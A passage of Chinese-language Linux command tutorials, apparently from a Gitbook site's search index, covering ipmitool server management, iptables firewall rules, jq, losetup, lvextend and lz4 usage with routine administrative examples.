桥接IPMI的请求到远程目标地址。 -U 远程服务用户名，默认为NULL。 -v 提高详细输出的级别。这个操作可以指定多次用来提高调试输出的级别。如果指定三次，那么你将会得到所有传入和传出的数据包。 -V 列出版本信息。 如果没有密码方法被指定，那么ipmitool将会提示用户输入密码。如果用户没有输入密码，那么远程服务密码将会设置为NULL。 3. 开关机，重启 查看开关机状态： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) power status 开机： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) power on 关机： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) power off 重启： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) power reset 4. 用户管理 说明：[ChannelNo] 字段是可选的，ChannoNo为1或者8；BMC默认有2个用户：user id为1的匿名用户，user id为2的ADMIN用户；<>字段为必选内容；：2为user权限，3为Operator权限，4为Administrator权限； 查看用户信息： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) user list [ChannelNo] 增加用户： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) user set name 设置密码： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) user set password 设置用户权限： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) user priv [ChannelNo] 启用/禁用用户： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) user enable/disable 5. IP网络设置 说明：[ChannelNo] 字段是可选的，ChannoNo为1(Share Nic网络)或者8（BMC独立管理网络）；设置网络参数，必须首先设置IP为静态，然后再进行其他设置； 查看网络信息： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) lan print [ChannelNo] 修改IP为静态还是DHCP模式： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) lan set ipsrc 修改IP地址： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) lan set ipaddr 修改子网掩码： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) lan set netmask 修改默认网关： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) lan set defgw ipaddr 6. SOL功能 说明：其中115.2代表115200，即*1000是表示的波特率。 设置SOL串口波特率： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) sol set volatile-bit-rate 打开SOL功能： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) sol activate 关闭SOL功能： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) sol deactivate 7. SEL日志查看 查看SEL日志： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) sel list 8. FRU信息查 看 查看FRU信息： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) fru list 9. SDR，Sensor信息查看 查看SDR Sensor信息： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) sdr 查看Sensor信息： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) sensor list 10. mc(管理单元BMC)状态和控制 重启动BMC： ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) mc reset 11. 设置BMC的iptables防火墙 设置某一段IP可以访问BMC ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) raw 0x32 0x76 0x01 0x01 ip1(0xa 0xa 0xa 0xa) ip2(0xb 0xb 0xb 0xb) ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) raw 0x32 0x76 0x09 设置某个IP可以访问BMC ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) raw 0x32 0x76 0x00 0x01 ip1(0xa 0xa 0xa 0xa) ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) raw 0x32 0x76 0x09 取消设置 ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) raw 0x32 0x76 0x08 4．获取防火墙设置 ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) raw 0x32 0x77 0x01 0x00 阻止/开启某个端口 ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) raw 0x32 0x76 0x02 0x00/0x01 0x00 (portno)0x22 0x00 取消某个端口的设置（6是5的对应取消操作） ipmitool -H (BMC的管理IP地址) -I lanplus -U (BMC登录用户名) -P (BMC 登录用户名的密码) raw 0x32 0x76 0x06 0x00/0x01 0x00 (portno)0x22 0x00 # service ipmi start # ipmitool -I open shell 可以直接进入本地BMC shell $ ipmitool -I lan -H -U shell 输入password,进入IPMI交互模式,当然这里也可以把shell直接换成bmc命令 , 另外ipmitool支持端口,所以是否可以先做DNAT，然后远程直接管理内网机器. ipmitool提供的功能要比windows下ipmish提供的功能多得多，用法相对复杂一些 12. 详细命令 引用 Ipmitool本地监控使用命令： ipmitool –I open command 其中-I open表示使用OpenIPMI接口，command有以下项： a) raw：发送一个原始的IPMI请求，并且打印回复信息。 b) Lan：配置网络（lan）信道(channel) c) chassis ：查看底盘的状态和设置电源 d) event：向BMC发送一个已经定义的事件（event），可用于测试配置的SNMP是否成功 e) mc： 查看MC（Management Contollor）状态和各种允许的项 f) sdr：打印传感器仓库中的所有监控项和从传感器读取到的值。 g) Sensor：打印详细的传感器信息。 h) Fru：打印内建的Field Replaceable Unit (FRU)信息 i) Sel： 打印 System Event Log (SEL) j) Pef： 设置 Platform Event Filtering (PEF)，事件过滤平台用于在监控系统发现有event时候，用PEF中的策略进行事件过滤，然后看是否需要报警。 k) Sol/isol：用于配置通过串口的Lan进行监控 l) User：设置BMC中用户的信息 。 m) Channel：设置Management Controller信道。 Ipmitool –I open sensor list //命令可以获取传感器中的各种监测值和该值的监测阈值，包括（CPU温度，电压，风扇转速，电源调制模块温度，电源电压等信息） Ipmitool –I open sensor get “CPU0Temp” //可以获取ID为CPU0Temp监测值，CPU0Temp是sensor的ID，服务器不同，ID表示也不同。 Ipmitool –I open sensor thresh //设置ID值等于id的监测项的各种限制值。 Ipmitool –I open chassis status //查看底盘状态，其中包括了底盘电源信息，底盘工作状态等 Ipmitool –I open chassis restart_cause //查看上次系统重启的原因 Ipmitool –I open chassis policy list //查看支持的底盘电源相关策略。 Ipmitool –I open chassis power on //启动底盘，用此命令可以远程开机 Ipmitool –I open chassis power off //关闭底盘，用此命令可以远程开机 Ipmitool –I open chassis power reset //实现硬重启，用此命令可以远程开机 Ipmi还可以设置系统启动boot的设备，具体见ipmitool帮助文档。 Ipmitool –I open mc reset //使BMC重新硬启动 Ipmitool –I open mc info //查看BMC硬件信息 Ipmitool –I open mc getenables //列出BMC所有允许的选项 Ipmitool –I open mc setenables =[on|off]，//设置bmc相应的允许/禁止选项。 Ipmitool-I open event 1 //发送一个温度过高的消息到System Event Log中，可以发送的Event有： 1 Temperature: Upper Critical: Going High 2 Voltage Threshold: Lower Critical: Going Low 3 Memory: Correctable ECC Error Detected Ipmitool-I open event //命令可以用测试配置的IPMI中的snmp功能是否成功。 Ipmitool -I open lan print 1 //打印现咱channel 1的信息 。 Ipmitool -I open lan set 1 ipaddr 10.10.113.95 //设置channel 1 的地址为10.10.113.95 Ipmitool -I open lan set 1 snmp public //设置channel 1 上snmp的community为public。 Ipmitool -I open lan set 1 access on //设置channel 1允许访问。 Ipmitool -I open pef info //打印Platform Event Filtering （pef）信息 Ipmitool -I open pef status //查看Platform Event Filtering （pef）状态 Ipmitool -I open pef policy //查看Platform Event Filtering （pef）策略设置 Ipmitool -I open sdr list fru //读取fru信息并显示。 [root@localhost ~]# yum install -y ipmitool #安装这个包 电源相关: 开启电源 ipmitool -I lanplus -H 10.41.1.41 -U root -P root power on 关闭电源 ipmitool -I lanplus -H 10.41.1.41 -U root -P root power off 重启电源 ipmitool -I lanplus -H 10.41.1.41 -U root -P root power reset 查看电源状态 ipmitool -I lanplus -H 10.41.1.41 -U root -P root power status 启动项相关: 设置为BIOS启动 ipmitool -I lanplus -H 10.41.1.41 -U root -P root chassis bootparam set bootflag force_bios 设置为pxe启动 ipmitool -I lanplus -H 10.41.1.41 -U root -P root chassis bootparam set bootflag force_pxe 设置为光盘启动 ipmitool -I lanplus -H 10.41.1.41 -U root -P root chassis bootparam set bootflag force_cdrom 设置为硬盘启动 ipmitool -I lanplus -H 10.41.1.41 -U root -P root chassis bootparam set bootflag force_disk 重启BMC ipmitool -I lanplus -H 10.41.1.41 -U root -P root mc reset cold 修改BMC密码 ipmitool -I lanplus -H 10.41.1.41 -U root -P root user set password 2 new_password #new_password 这个是新密码 远程文本重定向 重启服务器就能看到画面 ipmitool -I lanplus-H 10.41.1.41 -U root -P root sol activate 当有这个错误时 Info: SOL payload already active on another session ipmitool -I lanplus-H 10.41.1.41 -U root -P root sol deactivate #这命令是踢出其他的人会话 获取mac地址 有些机型不准 我这个是dell的服务器 华为服务器也可以使用 \"\"\"ipmitool -I lanplus -H 10.41.1.41 -U root -P root lan print |grep \"MAC Address\"|awk '{print $NF}'\"\"\" python脚本 from subprocess import Popen, PIPE cmd = \"\"\"ipmitool -I lanplus -H 10.41.1.41 -U root -P root lan print |grep \"MAC Address\"|awk '{print $NF}'\"\"\" text = Popen(cmd, stdout=PIPE, shell=True).stdout.read() prefix_mac = text[:-3] last_two = text[-2:] plus_one = int(last_two, 16) - 2 plus_one2 = int(last_two, 16) - 1 new_last_two = hex(plus_one)[2:] new_last_two2 = hex(plus_one2)[2:] if len(new_last_two) == 1: new_last_two = '0' + new_last_two if len(new_last_two2) == 1: new_last_two2 = '0' + new_last_two2 new_mac = prefix_mac.replace(':','') + new_last_two new_mac2 = prefix_mac.replace(':','') + new_last_two2 print(new_mac,new_mac2) 参考链接： ipmitool命令详解 Using IPMItool to View System Information ipmitool Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_iptables.html":{"url":"Linux-Command/Linux_Command_iptables.html","title":"Linux Command Iptables","keywords":"","body":"Linux Commnad iptables 防火墙1. 默认的四张表2. 默认的五条规则链3. 选项4. 规则4.1 编写规则：4.2 添加规则:4.3 查看规则:4.4 删除规则：5. iptables实例5.1 规则的基本匹配条件5.2 打开LINUX路由功能（转发功能）5.3 使用FORWARD链5.4 扩展匹配5.5 按数据包速率和状态匹配4.6 还可以限制链接数4.7 模拟随机丢包率6. rawLinux Commnad iptables 防火墙 tagsstart 网络 tagsstop [!NOTE|style:flat|lable:Mylable|iconVisibility:hidden] iptables service 在 /etc/sysconfig/iptables 中储存配置,而 firewalld将配置储存在/usr/lib/firewalld/ 和 /etc/firewalld/ 中的各种XML 1. 默认的四张表 1、filter:用于防火墙，默认有INPUT/OUTPUT/FORWARD三条链 2、nat:网络地址转换，PREROUTING/POSTROUTING/OUTPUT三条链 3、mangle：流量整形，五条链 4、raw：用于状态跟踪 2. 默认的五条规则链 1、INPUT: 如果一个数据包的目的地址是LINUX本身，则进入INPUT链 2、OUTPUT: 源地址是LINUX本身 3、FORWARD: 数据包从一块网卡接收，从另一块网卡发出，经过LINUX的包，进入这条链 4、PREROUTING: 路由前 5、POSTROUTING: 路由后 3. 选项 -t, --table table 对指定的表 table 进行操作， table 必须是 raw， nat，filter，mangle 中的一个。如果不指定此选项，默认的是 filter 表。 # 通用匹配：源地址目标地址的匹配 -p：指定要匹配的数据包协议类型； -s, --source [!] address[/mask] ：把指定的一个／一组地址作为源地址，按此规则进行过滤。当后面没有 mask 时，address 是一个地址，比如：192.168.1.1；当 mask 指定时，可以表示一组范围内的地址，比如：192.168.1.0/255.255.255.0。 -d, --destination [!] address[/mask] ：地址格式同上，但这里是指定地址为目的地址，按此进行过滤。 -i, --in-interface [!] ：指定数据包的来自来自网络接口，比如最常见的 eth0 。注意：它只对 INPUT，FORWARD，PREROUTING 这三个链起作用。如果没有指定此选项， 说明可以来自任何一个网络接口。同前面类似，\"!\" 表示取反。 -o, --out-interface [!] ：指定数据包出去的网络接口。只对 OUTPUT，FORWARD，POSTROUTING 三个链起作用。 # 查看管理命令 -L, --list [chain] 列出链 chain 上面的所有规则，如果没有指定链，列出表上所有链的所有规则。 # 规则管理命令 -A, --append chain rule-specification 在指定链 chain 的末尾插入指定的规则，也就是说，这条规则会被放到最后，最后才会被执行。规则是由后面的匹配来指定。 -I, --insert chain [rulenum] rule-specification 在链 chain 中的指定位置插入一条或多条规则。如果指定的规则号是1，则在链的头部插入。这也是默认的情况，如果没有指定规则号。 -D, --delete chain rule-specification -D, --delete chain rulenum 在指定的链 chain 中删除一个或多个指定规则。 -R num：Replays替换/修改第几条规则 # 链管理命令（这都是立即生效的） -P, --policy chain target ：为指定的链 chain 设置策略 target。注意，只有内置的链才允许有策略，用户自定义的是不允许的。 -F, --flush [chain] 清空指定链 chain 上面的所有规则。如果没有指定链，清空该表上所有链的所有规则。 -N, --new-chain chain 用指定的名字创建一个新的链。 -X, --delete-chain [chain] ：删除指定的链，这个链必须没有被其它任何规则引用，而且这条上必须没有任何规则。如果没有指定链名，则会删除该表中所有非内置的链。 -E, --rename-chain old-chain new-chain ：用指定的新名字去重命名指定的链。这并不会对链内部造成任何影响。 -Z, --zero [chain] ：把指定链，或者表中的所有链上的所有计数器清零。 -j, --jump target ：即满足某条件时该执行什么样的动作。target 可以是内置的目标，比如 ACCEPT，也可以是用户自定义的链。 -h：显示帮助信息； --state 匹配一组连接状态 --string 匹配应用层数据字节序列 --comment 注释数据 --probability 0.50000000000 -j KUBE-SEP-ID6YWIT3F6WNZ47P 使连接有50%的概率进入到KUBE-SEP-ID6YWIT3F6WNZ47P链 4. 规则 4.1 编写规则： 4.2 添加规则: -A 在链的末尾追加一条规则 -I 在链的开头插入一条规则 -L 列出所有的规则条目 4.3 查看规则: -n 以数字形式显示地址，端口等信息 -line-numbers 查看规则时，显示规则的序号 4.4 删除规则： -D 删除链内指定序号的一条规则 -F 清空所有的规则 -P 为指定的链设置默认规则 5. iptables实例 1、拒绝PING防火墙本身 $ iptables -F $ iptables -A INPUT -p icmp -j DROP 2、ping linux的IP地址 3、把防火墙规则再清空，把拒绝ICMP的目标规则改为REJECT，再次ping测试，看结果。 4、查看防火墙规则 $ iptables -nvL 5、允许指定IP地址的主机PING防火墙 $ iptables -I INPUT 1 -s 192.168.194.1 -p icmp -j ACCEPT 6、查看防火墙规则，每个规则注明序号 $ iptables -nL --line-numbers 7、删除防火墙的INPUT链中第二条规则 $ iptables –D INPUT 2 8、把OUTPUT的默认规则改为DROP $ iptables -P OUTPUT DROP # 限制syn并发数为每秒1次 $ iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT # 限制单个IP在60秒新建立的连接数为10 $ iptables -I INPUT -p tcp --dport 80 --syn -m recent --name SYN_FLOOD --update --seconds 60 --hitcount 10 -j REJECT 5.1 规则的基本匹配条件 1、允许特定IP地址访问LINUX的telnet服务 $ yum install -y telnet-server $ service xinetd start $ chkconfig telnet on $ iptables -P INPUT DROP $ iptables -A INPUT -s 192.168.194.1 -p tcp --dport 23 -j ACCEPT 2、继续第1步。向INPUT链插入规则，作为第一条。从eth0网卡收到的、访问telnet服务的数据包，拒绝。 $ iptables -I INPUT -i eth0 -p tcp --dport 23 -j REJECT 5.2 打开LINUX路由功能（转发功能） IS: 中间系统，路由器。 ES: 终端系统，主机系统。 1、临时打开路由功能 $ echo 1 > /proc/sys/net/ipv4/ip_forward $ cat /proc/sys/net/ipv4/ip_forward 1 2、永久打开转发功能 $ echo ‘echo 1 > /proc/sys/net/ipv4/ip_forward’ >> /etc/rc.local 或 $ vim /etc/sysctl.conf net.ipv4.ip_forward = 1 $ sysctl -p 5.3 使用FORWARD链 1、拓扑 2、拒绝192.168.195.0/24网段访问192.168.194.0/24网段的telnet服务 $ iptables -A FORWARD -s 192.168.195.0/24 -d 192.168.194.0/24 -p tcp --dport 23 -i eth1 -o eth0 -j REJECT 3、从拒绝SSH协议通过防火墙 $ iptables -A FORWARD -p tcp --dport 22 -j REJECT 4、不是192.168.195.0/24网段的主机访问SSH服务，可通过 $ iptables -I FORWARD ! -s 192.168.195.0/24 -p tcp --dport 22 -j ACCEPT 5、防火墙拒绝icmp的请求 $ iptables -A INPUT -p icmp --icmp-type echo-request -j REJECT 6、允许192.168.195.0/24网段进行PING $ iptables -I INPUT -s 192.168.195.0/24 -p icmp --icmp-type echo-request -j ACCEPT 7、防火墙拒绝发送echo-reply $ iptables -A OUTPUT -p icmp --icmp-type echo-reply -j REJECT 8、允许防火墙回应192.168.195.0/24网段的ping $ iptables -I OUTPUT -s 192.168.195.0/24 -p icmp --icmp-type echo-reply -j ACCEPT 9、防火墙拒绝192.168.195.0/24对其进行TCP连接。 检查SYN/ACK/RST/FIN四个位置，其中SYN被置位 $ iptables -I INPUT -s 192.168.195.0/24 -p tcp --tcp-flags SYN,ACK,RST,FIN SYN -j REJECT 5.4 扩展匹配 5.5 按数据包速率和状态匹配 -m state --state ，网络连接的五种状态 NEW，请求建立连接的包、完全陌生的包 ESTABLISHED，将要或已经建立连接的包 RELATED，与已知某个连接相关联的包 INVALID，无对应连接，以及连接无效的包 UNTRACKED，未跟踪状态的包 -m limit --limit 匹配速率 如： -m limit --limit 50/s -j ACCEPT -m state --state 状态 如： -m state --state INVALID,RELATED -j ACCEPT 2、192.168.194.0/24作为内网，192.168.195.0/24作为外网。从内到外的访问不受限制，从外到内的主动连接全部拒绝。 $ iptables -A FORWARD -s 192.168.194.0/24 -j ACCEPT $ iptables -A FORWARD -d 192.168.194.0/24 -j REJECT $ iptables -I FORWARD 2 -d 192.168.194.0/24 \\ -m state --state ESTABLISHED,RELATED -j ACCEPT 3、减轻DOS（拒绝服务）攻击 4、免状态跟踪 4.6 还可以限制链接数 -m connlimit --connlimit-above n 限制为多少个 //表示限制链接数最大为9个 iptables -I FORWARD -p tcp -m connlimit --connlimit-above 9 -j DROP //表示访问80端口服务最大为10个链接 iptable -A INPUT -p tcp -- dport 80 -m connlimit --connlimit-above 10 -j REJECT 4.7 模拟随机丢包率 iptables -A FORWARD -p icmp -m statistic --mode random --probability 0.31 -j REJECT //表示31%的丢包率 -m random --average 5 -j DROP 表示模拟丢掉5%比例的包 6. raw 追踪数据包 # 在宿主机上执行 $ iptables -t raw -A OUTPUT -p icmp -j TRACE $ iptables -t raw -A PREROUTING -p icmp -j TRACE 更多阅读： iptables 命令 iptables-extensions iptables(8) - Linux man page Sysadmin tools: How to use iptables Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_jq.html":{"url":"Linux-Command/Linux_Command_jq.html","title":"Linux Command Jq","keywords":"","body":"Linux Command jq 格式转换1. 简介2. 参数3. 举例Linux Command jq 格式转换 tagsstart 文件管理 tagsstop 图 1.2.38.1：在这里插入图片描述 1. 简介 jq命令可以在命令行处理json数据 2. 参数 常用选项 -c 紧凑输出json数据 -e 根据输出结果设置命令退出状态码 -s 读取所有输入到一个数组 -r 输出原始字符串，而不是一个JSON格式 -C 高亮显示 -M 单色显示 -S 排序对象 --tab 使用tab缩进 3. 举例 紧凑输出json数据 $ jq -c . test.json [{\"lon\":113.30765,\"name\":\"广州市\",\"code\":\"4401\",\"lat\":23.422825},{\"lon\":113.59446,\"name\":\"韶关市\",\"code\":\"4402\",\"lat\":24.80296}] 根据输出结果设置命令退出状态码 $ jq -c -e '.[0]|{names}|.names' test.json null $ echo $? 1 读取所有输出到一个数组(也就是所在json数据最外层套一个数组) $ echo '{\"safd\":\"fsafd\"}' | jq -r . { \"safd\": \"fsafd\" } $ echo '{\"safd\":\"fsafd\"}' | jq -s . [ { \"safd\": \"fsafd\" } ] 输出原始字符串，而不是一个JSON格式 $ echo '{\"safd\":\"fsafd\"}' | jq .[] \"fsafd\" $ echo '{\"safd\":\"fsafd\"}' | jq -r .[] fsafd 单色显示 $ echo '{\"safd\":\"fsafd\"}' | jq . { \"safd\": \"fsafd\" } $ echo '{\"safd\":\"fsafd\"}' | jq -M . { \"safd\": \"fsafd\" } 排序对象 $ jq . test.json [ { \"lon\": 113.30765, \"name\": \"广州市\", \"code\": \"4401\", \"lat\": 23.422825 }, { \"lon\": 113.59446, \"name\": \"韶关市\", \"code\": \"4402\", \"lat\": 24.80296 } ] $ jq -S . test.json [ { \"code\": \"4401\", \"lat\": 23.422825, \"lon\": 113.30765, \"name\": \"广州市\" }, { \"code\": \"4402\", \"lat\": 24.80296, \"lon\": 113.59446, \"name\": \"韶关市\" } ] 以table缩进 $ echo '{\"safd\":\"fsafd\"}' | jq --tab . { \"safd\": \"fsafd\" } 获取上面地理json数据里的name值 $ jq '.[]|{name}' test.json { \"name\": \"广州市\" } { \"name\": \"韶关市\" } 获取第一个name值 $ jq '.[0]|{name}' test.json { \"name\": \"广州市\" } 只打印出第一个map的值： $ jq '.[0]|.[]' test.json 113.30765 \"广州市\" \"4401\" 23.422825 打印出一个map的name值 $ jq '.[0]|.name' test.json \"广州市\" 打印出一个map的name值并已普通字符串显示 $ jq -r '.[0]|.name' test.json 广州市 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:19:33 "},"Linux-Command/Linux_Command_losetup.html":{"url":"Linux-Command/Linux_Command_losetup.html","title":"Linux Command Losetup","keywords":"","body":"Linux Command losetup 设置循环设备1. 背景2. 简介3. 语法4. 参数5. 实例5.1 示例15.2 示例2Linux Command losetup 设置循环设备 tagsstart 设备管理 tagsstop 1. 背景 在类 UNIX 系统里，loop 设备是一种伪设备(pseudo-device)，或者也可以说是仿真设备。它能使我们像块设备一样访问一个文件。 在使用之前，一个 loop 设备必须要和一个文件进行连接。这种结合方式给用户提供了一个替代块特殊文件的接口。因此，如果这个文件包含有一个完整的文件系统，那么这个文件就可以像一个磁盘设备一样被 mount 起来。 上面说的文件格式，我们经常见到的是 CD 或 DVD 的 ISO 光盘镜像文件或者是软盘(硬盘)的 *.img 镜像文件。通过这种 loop mount (回环mount)的方式，这些镜像文件就可以被 mount 到当前文件系统的一个目录下。 至此，顺便可以再理解一下 loop 之含义：对于第一层文件系统，它直接安装在我们计算机的物理设备之上；而对于这种被 mount 起来的镜像文件(它也包含有文件系统)，它是建立在第一层文件系统之上，这样看来，它就像是在第一层文件系统之上再绕了一圈的文件系统，所以称为 loop。 2. 简介 Linux losetup命令用于设置循环设备。 循环设备可把文件虚拟成区块设备，籍以模拟整个文件系统，让用户得以将其视为硬盘驱动器，光驱或软驱等设备，并挂入当作目录来使用。 3. 语法 losetup [-d][-e ][-o ][循环设备代号][文件] 4. 参数 -d 卸除设备。 -e 启动加密编码。 -o 设置数据平移的数目。 5. 实例 5.1 示例1 （1）创建空的磁盘镜像文件，这里创建一个1.44M的软盘 $ dd if=/dev/zero of=floppy.img bs=512 count=2880 （2）使用 losetup将磁盘镜像文件虚拟成块设备 $ losetup /dev/loop1 floppy.img （3）挂载块设备 $ mount /dev/loop0 /tmp 经过上面的三步之后，我们就可以通过/tmp目录，像访问真实快设备一样来访问磁盘镜像文件floppy.img。 （4） 卸载loop设备 $ umount /tmp $ losetup -d /dev/loop1 5.2 示例2 首先创建一个 1G 大小的空文件： # dd if=/dev/zero of=loopfile.img bs=1G count=1 1+0 records in 1+0 records out 1073741824 bytes (1.1 GB) copied, 69.3471 s, 15.5 MB/s 对该文件格式化为 ext4 格式： # mkfs.ext4 loopfile.img 。。。。 用 file 命令查看下格式化后的文件类型： # file loopfile.img loopfile.img: Linux rev 1.0 ext4 filesystem data, UUID=a9dfb4a0-6653-4407-ae05-7044d92c1159 (extents) (large files) (huge files) 准备将上面的文件挂载起来： # mkdir /mnt/loopback # mount -o loop loopfile.img /mnt/loopback mount 命令的 -o loop 选项可以将任意一个 loopback 文件系统挂载。 上面的 mount 命令实际等价于下面两条命令： # losetup /dev/loop0 loopfile.img # mount /dev/loop0 /mnt/loopback 因此实际上，mount -o loop 在内部已经默认的将文件和 /dev/loop0 挂载起来了。 然而对于第一种方法(mount -o loop)并不能适用于所有的场景。比如，我们想创建一个硬盘文件，然后对该文件进行分区，接着挂载其中一个子分区，这时就不能用 -o loop 这种方法了。因此必须如下做： # losetup /dev/loop1 loopfile.img # fdisk /dev/loop1 卸载挂载点： # umount /mnt/loopback 参考： https://man7.org/linux/man-pages/man8/losetup.8.html Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_lvextend.html":{"url":"Linux-Command/Linux_Command_lvextend.html","title":"Linux Command Lvextend","keywords":"","body":"Linux command lvextend 扩展逻辑卷设备1. 简介2. 语法3. 常用参数4. 安装5. 实例5.1 通过设置大小进行扩展5.2 按特定单元扩展5.3 百分比扩展5.4 使用剩余的可用空间进行扩展Linux command lvextend 扩展逻辑卷设备 tagsstart 设备 tagsstop 图 1.2.40.1：在这里插入图片描述 1. 简介 lvextend 命令来自于英文词组“logical volume extend”的缩写，其功能是用于扩展逻辑卷设备。LVM逻辑卷管理器技术具有灵活调整卷组与逻辑卷的特点，逻辑卷设备容量可以在创建时规定，亦可以后期根据业务需求进行动态扩展或缩小。 2. 语法 lvextend [参数] 逻辑卷 3. 常用参数 -L 指定逻辑卷的大小（容量单位） -l 指定逻辑卷的大小（PE个数） 4. 安装 $ sudo apt-get install lvm2 检查 LVM 的版本以验证安装 $ lvm version 5. 实例 5.1 通过设置大小进行扩展 将卷扩展至 290M # 将卷扩展至 290M $ lvextend -L 290M /dev/VolGroup00/LogVol00 Rounding size to boundary between physical extents: 292.00 MiB. Size of logical volume storage/vo changed from 148 MiB (37 extents) to 292 MiB (73 extents). Logical volume /dev/VolGroup00/LogVol00 successfully resized. $ pvs $ lvs $ vgs 使用resizefs2命令重新加载逻辑卷的大小才能生效。 $ resize2fs /dev/VolGroup00/LogVol00 5.2 按特定单元扩展 将卷扩展增加 100M lvextend -L +100M /dev/VolGroup00/LogVol00 图 1.2.40.2：在这里插入图片描述 5.3 百分比扩展 lvextend 还支持指定扩展逻辑卷的百分比。指定的百分比将当前大小扩展为总空间的百分比。例如，让我们扩展 5%。我们目前的大小是332.00M。 lvextend -l +5%VG /dev/vg01/lv01 5.4 使用剩余的可用空间进行扩展 上述方法扩展到总空间的一小部分。但是，此方法会根据可用空间的百分比进行扩展。因此，使用 100% 将扩展并使用所有可用的可用空间。 让我们使用下面的命令扩展 50% 的可用空间。 lvextend -l +50%FREE /dev/vg01/lv01 lvextend -l +100%FREE /dev/volgroup/logvol 参考： lvextend(8) — Linux manual page The lvextend Linux Command Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-11-14 07:53:54 "},"Linux-Command/Linux_Command_lz4.html":{"url":"Linux-Command/Linux_Command_lz4.html","title":"Linux Command Lz 4","keywords":"","body":"Linux Command lz4 压缩1. lz41.1 安装1.2 方法1.3 参数1.4 举例Linux Command lz4 压缩 tagsstart 文件管理 压缩解压 tagsstop 1. lz4 特点：lz4压缩率略低，解压速度惊人 1.1 安装 yum install -y lz4 lz4-devel 1.2 方法 压缩 (默认解压之后的名称filename.lz4) # lz4 filename 解压缩 # lz4 -d filename.lz4 centos7下默认有lz4_decompress 命令，可以直接解压, 并可以定义解压后的文件名 # lz4_decompress filename.lz4 filename # lz4_decompress filename.lz4 filename.txt 1.3 参数 参数 -1: 快速压缩（默认） -9: 高压缩 -d: 解压缩（默认为.lz4扩展名） -z: 强制压缩 -f: 覆盖输出而不提示 -k: 保留源文件（默认） --rm: 成功地解除/压缩后删除源文件 -h/-h: 显示帮助/长帮助和退出 高级参数 -v: 显示版本号并退出 -v: 详细模式 -q: 取消警告；指定两次也可以取消错误 -c: 强制写入标准输出，即使它是控制台 -t: 测试压缩文件完整性 -m: 多个输入文件（表示自动输出文件名） -r: 在目录上递归操作（也设置为-m） -l: 使用旧格式压缩（Linux内核压缩） 1.4 举例 1) 对test文件进行压缩 $ lz4 test Compressed filename will be : test.lz4 Compressed 8 bytes into 27 bytes ==> 337.50% $ ls test test.lz4 快速压缩（-1参数），默认的就是快速压缩，如上面那条命令 $ rm -f test.lz4 $ lz4 -1 test Compressed filename will be : test.lz4 Compressed 8 bytes into 27 bytes ==> 337.50% $ ls test test.lz4 高压缩（-9参数） $ rm -f test.lz4 $ lz4 -9 test Compressed filename will be : test.lz4 Compressed 8 bytes into 27 bytes ==> 337.50% $ ls test test.lz4 当出现同名压缩文件时，直接压缩默认会有是否覆盖的提示信息 $ lz4 -9 test Compressed filename will be : test.lz4 test.lz4 already exists; do you wish to overwrite (y/N) ? y Compressed 8 bytes into 27 bytes ==> 337.50% 已存在同名压缩文件时，直接压缩而不输出是否覆盖的提示信息 $ lz4 -9 -f test Compressed filename will be : test.lz4 Compressed 8 bytes into 27 bytes ==> 337.50% $ 